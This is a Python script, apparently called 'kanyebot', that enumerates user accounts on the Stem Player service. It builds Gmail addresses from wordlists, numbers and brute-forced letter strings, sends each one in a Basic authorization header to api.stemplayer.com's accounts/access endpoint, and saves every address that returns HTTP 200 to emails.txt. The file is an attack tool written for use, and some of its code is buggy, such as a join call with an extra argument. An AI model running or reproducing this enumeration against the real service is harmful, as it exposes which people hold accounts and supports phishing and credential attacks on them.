from argparse import RawTextHelpFormatter
from colorama import Fore, Style
import requests
import argparse
import time
import base64
import string
import itertools
import sys

range_list = list(range(0, 16))
character_list = list(string.ascii_lowercase)
number_list = list(range(0, 99))
word_list = open("wordlist.txt","r").read().split("\n")
args = sys.argv

emails = []

version = "1.0.0"

def generate(l):
	for num_item in enumerate(range_list):
		yield from itertools.product(*([l] * num_item[0]))

def test(test_email, pause):
		time.sleep(pause)
		email = str(test_email) + "@gmail.com"
		timestamp = round(int(time.time()))
		authorization = email + ':' + str(timestamp)
		bytes = authorization.encode("utf-8")

		bytes = base64.b64encode(bytes)
		authorization = bytes.decode("utf_8")

		headers = {
			'Authorization': 'Basic ' + authorization
		}
		r = requests.get("https://api.stemplayer.com/accounts/access", headers=headers)
		if r.status_code == 200:
			print(email)
			emails.append(email)
		else:
			print(Style.DIM + email + Style.RESET_ALL)

def logo():
	return """
  _  __                      _           _   
 | |/ /                     | |         | |  
 | ' / __ _ _ __  _   _  ___| |__   ___ | |_ 
 |  < / _` | '_ \| | | |/ _ \ '_ \ / _ \| __|
 | . \ (_| | | | | |_| |  __/ |_) | (_) | |_ 
 |_|\_\__,_|_| |_|\__, |\___|_.__/ \___/ \__|
                   __/ |                     
                  |___/                      
v%s
	""" % "1.0.0"

def arguments():
	parser = argparse.ArgumentParser(prog="knockpy", description="kanyebot", formatter_class=RawTextHelpFormatter)
	parser.add_argument("-v", "--version", action="version", version="v" + version)
	parser.add_argument("--no-wordlist", help="Ignore any word lists", action="store_true", required=False)
	parser.add_argument("--no-numberlist", help="Ignore the number list", action="store_true", required=False)
	parser.add_argument("--no-characterlist", help="Ignore the character list", action="store_true", required=False)
	parser.add_argument("-w", help="Adds a custom wordlist to the list", dest="wordlist", required=False)
	parser.add_argument("-p", help="Sets the pause after each search", nargs=1, dest="pause", type=int, required=False)

	args = parser.parse_args()

	return args

def header():
	args = arguments()
	line = "Emails: "
	count = 0

	if args.wordlist and not args.no_wordlist:
		count = len(open(args.wordlist,"r").read().split("\n"))

	if not args.no_wordlist:
		count = count + len(word_list)

	if not args.no_characterlist:
		count = count + 43608742900000000000000

	if not args.no_numberlist:
		count = count + len(number_list)

	return Style.BRIGHT + Fore.YELLOW + line + Fore.CYAN + str(count) + Style.RESET_ALL

def main():
	args = arguments()
	
	print(logo())

	print(header())
	print(Style.RESET_ALL)

	pause = 0.25

	if args.pause is not None:
		pause = args.pause[0]

	if args.wordlist and not args.no_wordlist:
		for x in open(args.wordlist,"r").read().split("\n"):
			test(x, pause)

	if not args.no_wordlist:
		for x in word_list:
			test(x, pause)

	if not args.no_characterlist:
		for x in generate("abcdefghijklmnopqrstuvwxyz"):
			test(''.join(x, pause))

	if not args.no_numberlist:
		for x in number_list:
			test(x, pause)

	with open('emails.txt', 'w') as f:
		for item in emails:
			f.write("%s\n" % item)

main()